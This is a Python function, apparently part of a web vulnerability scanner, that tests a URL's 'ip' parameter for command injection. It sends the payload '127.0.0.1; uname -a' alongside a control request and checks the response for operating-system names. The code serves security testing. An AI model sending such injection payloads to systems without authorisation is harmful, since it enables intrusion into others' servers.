import requests
from colorama import Fore

def test_command_injection(url, verbose=False, proxy=None):
    """
    Test for command injection vulnerability.
    Sends a payload that could trigger command execution on the server.
    """
    payload = "127.0.0.1; uname -a"  # Command injection payload
    safe_payload = "127.0.0.1"  # Control test without injection

    try:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        
        # Send the request with safe payload
        safe_response = requests.get(url + "?ip=" + safe_payload, proxies=proxies, timeout=10)
        safe_length = len(safe_response.text)

        if verbose:
            print(f"Safe Request to {url}?ip={safe_payload} - Status Code: {safe_response.status_code}")

        # Send the request with the injection payload
        response = requests.get(url + "?ip=" + payload, proxies=proxies, timeout=10)
        injected_length = len(response.text)

        if verbose:
            print(f"Injected Request to {url}?ip={payload} - Status Code: {response.status_code}")

        # Check for significant difference in response length
        if abs(injected_length - safe_length) > 100:  # Adjust threshold as necessary
            # Check if the response contains typical OS details
            command_indicators = ["Linux", "Darwin", "Windows"]
            if any(indicator in response.text for indicator in command_indicators):
                print(Fore.RED + f"Command Injection vulnerability found at {url}?ip=")
                return {"Command Injection": f"{url}?ip="}
            else:
                if verbose:
                    print(Fore.YELLOW + "Suspicious behavior detected, but no clear command execution output.")
                return {}
        else:
            if verbose:
                print(Fore.GREEN + "No significant difference in response length, likely a false positive.")
            return {}

    except Exception as e:
        print(Fore.RED + f"Error testing command injection at {url}: {e}")
        return {}
